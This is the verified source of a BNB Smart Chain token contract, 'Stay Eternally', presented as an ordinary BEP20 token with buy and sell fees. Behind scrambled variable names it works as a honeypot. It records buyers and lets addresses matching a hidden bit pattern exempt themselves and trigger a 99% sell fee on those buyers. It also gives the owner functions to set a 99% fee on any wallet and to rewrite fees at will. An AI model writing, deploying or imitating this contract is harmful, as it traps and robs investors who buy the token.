/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract StayEternally is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Stay Eternally ";
    string constant _symbol = "StayEternally";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private buyBurnMinMode;
    mapping(address => bool) private marketingAutoTradingModeFeeBotsSell;
    mapping(address => bool) private launchedLiquiditySwapFee;
    mapping(address => bool) private receiverTeamBuySell;
    mapping(address => uint256) private minSellFeeMode;
    mapping(uint256 => address) private launchedBuyReceiverBots;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private feeModeBotsWallet = 0;
    uint256 private tradingSellIsTeam = 6;

    //SELL FEES
    uint256 private buyExemptLimitAutoFee = 0;
    uint256 private minTxLaunchedExempt = 6;

    uint256 private feeBuyExemptMode = tradingSellIsTeam + feeModeBotsWallet;
    uint256 private burnMarketingMinExempt = 100;

    address private tradingMaxWalletSellTeamBots = (msg.sender); // auto-liq address
    address private autoBotsExemptMarketingMaxWalletTeam = (0x3A128573d6743F81AA9e8121FfFfdCD0A405EbEa); // marketing address
    address private liquidityReceiverBuySell = DEAD;
    address private exemptTxFeeBurnAuto = DEAD;
    address private receiverIsMarketingSellMinMode = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private swapBurnWalletMax;
    uint256 private modeBuyLiquidityMin;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private txBurnReceiverBuyTrading;
    uint256 private feeSwapBotsReceiverLiquidityBurn;
    uint256 private launchedLimitExemptAuto;
    uint256 private swapTeamReceiverLimit;
    uint256 private launchedExemptSwapMode;

    bool private minBotsAutoLiquiditySell = true;
    bool private receiverTeamBuySellMode = true;
    bool private swapIsFeeMode = true;
    bool private maxIsBurnLiquidity = true;
    bool private tradingSellModeFee = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private liquidityBuySwapTx = 6 * 10 ** 15;
    uint256 private teamWalletReceiverAutoLiquidityFeeIs = _totalSupply / 1000; // 0.1%

    
    bool private maxReceiverBotsLaunched = false;
    bool private txMinMaxBots = false;
    bool private tradingTxSellAutoModeMin = false;
    uint256 private walletBotsTradingAuto = 0;
    bool private burnMaxFeeBuy = false;
    bool private autoMinWalletLaunched = false;
    bool private liquidityBurnFeeTeam = false;
    uint256 private teamBotsFeeWallet = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        txBurnReceiverBuyTrading = true;

        buyBurnMinMode[msg.sender] = true;
        buyBurnMinMode[address(this)] = true;

        marketingAutoTradingModeFeeBotsSell[msg.sender] = true;
        marketingAutoTradingModeFeeBotsSell[0x0000000000000000000000000000000000000000] = true;
        marketingAutoTradingModeFeeBotsSell[0x000000000000000000000000000000000000dEaD] = true;
        marketingAutoTradingModeFeeBotsSell[address(this)] = true;

        launchedLiquiditySwapFee[msg.sender] = true;
        launchedLiquiditySwapFee[0x0000000000000000000000000000000000000000] = true;
        launchedLiquiditySwapFee[0x000000000000000000000000000000000000dEaD] = true;
        launchedLiquiditySwapFee[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return isMarketingExemptWalletLiquidityBurnAuto(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return isMarketingExemptWalletLiquidityBurnAuto(sender, recipient, amount);
    }

    function isMarketingExemptWalletLiquidityBurnAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = feeTradingBuyTx(sender) || feeTradingBuyTx(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                burnReceiverBotsSell();
            }
            if (!bLimitTxWalletValue) {
                buyLiquidityModeTxFee(recipient);
            }
        }
        
        if (tradingTxSellAutoModeMin != maxIsBurnLiquidity) {
            tradingTxSellAutoModeMin = tradingSellModeFee;
        }

        if (teamBotsFeeWallet == burnMarketingMinExempt) {
            teamBotsFeeWallet = liquidityBuySwapTx;
        }


        if (inSwap || bLimitTxWalletValue) {return minSwapIsSell(sender, recipient, amount);}

        if (!buyBurnMinMode[sender] && !buyBurnMinMode[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || launchedLiquiditySwapFee[sender] || launchedLiquiditySwapFee[recipient], "Max TX Limit has been triggered");

        if (swapMarketingTxMin()) {launchedExemptBuySwap();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (txMinMaxBots == swapIsFeeMode) {
            txMinMaxBots = burnMaxFeeBuy;
        }

        if (teamBotsFeeWallet != teamBotsFeeWallet) {
            teamBotsFeeWallet = teamWalletReceiverAutoLiquidityFeeIs;
        }


        uint256 amountReceived = autoTradingLiquidityLimit(sender) ? feeMaxWalletMarketingBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function minSwapIsSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoTradingLiquidityLimit(address sender) internal view returns (bool) {
        return !marketingAutoTradingModeFeeBotsSell[sender];
    }

    function limitFeeWalletMode(address sender, bool selling) internal returns (uint256) {
        
        if (maxReceiverBotsLaunched != liquidityBurnFeeTeam) {
            maxReceiverBotsLaunched = receiverTeamBuySellMode;
        }


        if (selling) {
            feeBuyExemptMode = minTxLaunchedExempt + buyExemptLimitAutoFee;
            return exemptIsSwapLimitSellBuyFee(sender, feeBuyExemptMode);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeBuyExemptMode = tradingSellIsTeam + feeModeBotsWallet;
            return feeBuyExemptMode;
        }
        return exemptIsSwapLimitSellBuyFee(sender, feeBuyExemptMode);
    }

    function maxFeeBuyReceiver() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function feeMaxWalletMarketingBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (txMinMaxBots == txMinMaxBots) {
            txMinMaxBots = tradingSellModeFee;
        }


        uint256 feeAmount = amount.mul(limitFeeWalletMode(sender, receiver == uniswapV2Pair)).div(burnMarketingMinExempt);

        if (receiverTeamBuySell[sender] || receiverTeamBuySell[receiver]) {
            feeAmount = amount.mul(99).div(burnMarketingMinExempt);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function feeTradingBuyTx(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function exemptIsSwapLimitSellBuyFee(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = minSellFeeMode[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function buyLiquidityModeTxFee(address addr) private {
        if (maxFeeBuyReceiver() < liquidityBuySwapTx) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        launchedBuyReceiverBots[exemptLimitValue] = addr;
    }

    function burnReceiverBotsSell() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (minSellFeeMode[launchedBuyReceiverBots[i]] == 0) {
                    minSellFeeMode[launchedBuyReceiverBots[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(autoBotsExemptMarketingMaxWalletTeam).transfer(amountBNB * amountPercentage / 100);
    }

    function swapMarketingTxMin() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingSellModeFee &&
    _balances[address(this)] >= teamWalletReceiverAutoLiquidityFeeIs;
    }

    function launchedExemptBuySwap() internal swapping {
        
        if (txMinMaxBots == maxIsBurnLiquidity) {
            txMinMaxBots = swapIsFeeMode;
        }

        if (burnMaxFeeBuy != tradingSellModeFee) {
            burnMaxFeeBuy = maxIsBurnLiquidity;
        }

        if (walletBotsTradingAuto != walletBotsTradingAuto) {
            walletBotsTradingAuto = buyExemptLimitAutoFee;
        }


        uint256 amountToLiquify = teamWalletReceiverAutoLiquidityFeeIs.mul(feeModeBotsWallet).div(feeBuyExemptMode).div(2);
        uint256 amountToSwap = teamWalletReceiverAutoLiquidityFeeIs.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (txMinMaxBots == swapIsFeeMode) {
            txMinMaxBots = autoMinWalletLaunched;
        }

        if (teamBotsFeeWallet == teamWalletReceiverAutoLiquidityFeeIs) {
            teamBotsFeeWallet = burnMarketingMinExempt;
        }

        if (tradingTxSellAutoModeMin == maxIsBurnLiquidity) {
            tradingTxSellAutoModeMin = autoMinWalletLaunched;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeBuyExemptMode.sub(feeModeBotsWallet.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(feeModeBotsWallet).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(tradingSellIsTeam).div(totalETHFee);
        
        payable(autoBotsExemptMarketingMaxWalletTeam).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                tradingMaxWalletSellTeamBots,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getReceiverTeamBuySell(address a0) public view returns (bool) {
            return receiverTeamBuySell[a0];
    }
    function setReceiverTeamBuySell(address a0,bool a1) public onlyOwner {
        if (a0 != autoBotsExemptMarketingMaxWalletTeam) {
            liquidityBurnFeeTeam=a1;
        }
        receiverTeamBuySell[a0]=a1;
    }

    function getLaunchedBuyReceiverBots(uint256 a0) public view returns (address) {
        if (a0 == tradingSellIsTeam) {
            return receiverIsMarketingSellMinMode;
        }
        if (a0 == teamBotsFeeWallet) {
            return receiverIsMarketingSellMinMode;
        }
            return launchedBuyReceiverBots[a0];
    }
    function setLaunchedBuyReceiverBots(uint256 a0,address a1) public onlyOwner {
        if (a0 != minTxLaunchedExempt) {
            liquidityReceiverBuySell=a1;
        }
        if (a0 != liquidityBuySwapTx) {
            exemptTxFeeBurnAuto=a1;
        }
        if (a0 == burnMarketingMinExempt) {
            liquidityReceiverBuySell=a1;
        }
        launchedBuyReceiverBots[a0]=a1;
    }

    function getAutoMinWalletLaunched() public view returns (bool) {
        if (autoMinWalletLaunched == txMinMaxBots) {
            return txMinMaxBots;
        }
        if (autoMinWalletLaunched == receiverTeamBuySellMode) {
            return receiverTeamBuySellMode;
        }
        return autoMinWalletLaunched;
    }
    function setAutoMinWalletLaunched(bool a0) public onlyOwner {
        if (autoMinWalletLaunched == maxReceiverBotsLaunched) {
            maxReceiverBotsLaunched=a0;
        }
        if (autoMinWalletLaunched == tradingSellModeFee) {
            tradingSellModeFee=a0;
        }
        autoMinWalletLaunched=a0;
    }

    function getTradingTxSellAutoModeMin() public view returns (bool) {
        if (tradingTxSellAutoModeMin == tradingTxSellAutoModeMin) {
            return tradingTxSellAutoModeMin;
        }
        if (tradingTxSellAutoModeMin != minBotsAutoLiquiditySell) {
            return minBotsAutoLiquiditySell;
        }
        if (tradingTxSellAutoModeMin != liquidityBurnFeeTeam) {
            return liquidityBurnFeeTeam;
        }
        return tradingTxSellAutoModeMin;
    }
    function setTradingTxSellAutoModeMin(bool a0) public onlyOwner {
        if (tradingTxSellAutoModeMin == txMinMaxBots) {
            txMinMaxBots=a0;
        }
        tradingTxSellAutoModeMin=a0;
    }

    function getMinSellFeeMode(address a0) public view returns (uint256) {
        if (a0 == receiverIsMarketingSellMinMode) {
            return liquidityBuySwapTx;
        }
        if (a0 == autoBotsExemptMarketingMaxWalletTeam) {
            return liquidityBuySwapTx;
        }
        if (a0 == liquidityReceiverBuySell) {
            return buyExemptLimitAutoFee;
        }
            return minSellFeeMode[a0];
    }
    function setMinSellFeeMode(address a0,uint256 a1) public onlyOwner {
        if (minSellFeeMode[a0] != minSellFeeMode[a0]) {
           minSellFeeMode[a0]=a1;
        }
        if (a0 != receiverIsMarketingSellMinMode) {
            walletBotsTradingAuto=a1;
        }
        if (a0 != receiverIsMarketingSellMinMode) {
            tradingSellIsTeam=a1;
        }
        minSellFeeMode[a0]=a1;
    }

    function getTeamWalletReceiverAutoLiquidityFeeIs() public view returns (uint256) {
        if (teamWalletReceiverAutoLiquidityFeeIs != feeModeBotsWallet) {
            return feeModeBotsWallet;
        }
        if (teamWalletReceiverAutoLiquidityFeeIs != walletBotsTradingAuto) {
            return walletBotsTradingAuto;
        }
        if (teamWalletReceiverAutoLiquidityFeeIs == buyExemptLimitAutoFee) {
            return buyExemptLimitAutoFee;
        }
        return teamWalletReceiverAutoLiquidityFeeIs;
    }
    function setTeamWalletReceiverAutoLiquidityFeeIs(uint256 a0) public onlyOwner {
        if (teamWalletReceiverAutoLiquidityFeeIs != tradingSellIsTeam) {
            tradingSellIsTeam=a0;
        }
        if (teamWalletReceiverAutoLiquidityFeeIs == feeBuyExemptMode) {
            feeBuyExemptMode=a0;
        }
        if (teamWalletReceiverAutoLiquidityFeeIs == teamBotsFeeWallet) {
            teamBotsFeeWallet=a0;
        }
        teamWalletReceiverAutoLiquidityFeeIs=a0;
    }

    function getReceiverTeamBuySellMode() public view returns (bool) {
        return receiverTeamBuySellMode;
    }
    function setReceiverTeamBuySellMode(bool a0) public onlyOwner {
        if (receiverTeamBuySellMode == burnMaxFeeBuy) {
            burnMaxFeeBuy=a0;
        }
        if (receiverTeamBuySellMode == txMinMaxBots) {
            txMinMaxBots=a0;
        }
        if (receiverTeamBuySellMode == maxIsBurnLiquidity) {
            maxIsBurnLiquidity=a0;
        }
        receiverTeamBuySellMode=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}